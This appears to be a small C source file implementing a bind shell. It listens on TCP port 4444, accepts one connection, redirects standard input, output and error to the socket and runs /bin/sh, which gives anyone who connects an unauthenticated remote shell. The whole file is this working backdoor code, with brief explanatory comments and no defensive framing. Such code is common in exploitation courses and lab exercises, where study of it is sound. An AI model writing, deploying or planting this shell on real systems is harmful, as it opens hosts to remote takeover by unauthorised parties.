#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 4444

int sock_fd, bind_fd;
struct sockaddr_in s_addr, d_addr;

int main(int argc, char **argv) {
    // Create a TCP socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    // Initialize sockaddr_in struct
    s_addr.sin_family = AF_INET;
    s_addr.sin_port = htons(PORT);
    s_addr.sin_addr.s_addr = htonl(INADDR_ANY);
      
    // Bind to any local address on the specified port and listen
    bind(sock_fd, (struct sockaddr *) &s_addr, sizeof(s_addr));
    
    // Listen for connections with a queue size of 1
    listen(sock_fd, 1);

    // Accept a connection
    socklen_t d_addr_len = sizeof(d_addr);
    bind_fd = accept(sock_fd, (struct sockaddr *) &d_addr, &d_addr_len);
      
    // Duplicate stdin/out/err file descriptors
    for (int i = 2; i >= 0; i--) dup2(bind_fd, i);

    // Execute shell
    execl("/bin/sh", NULL, NULL);
    close(sock_fd);
    close(bind_fd);

    return 0;
}
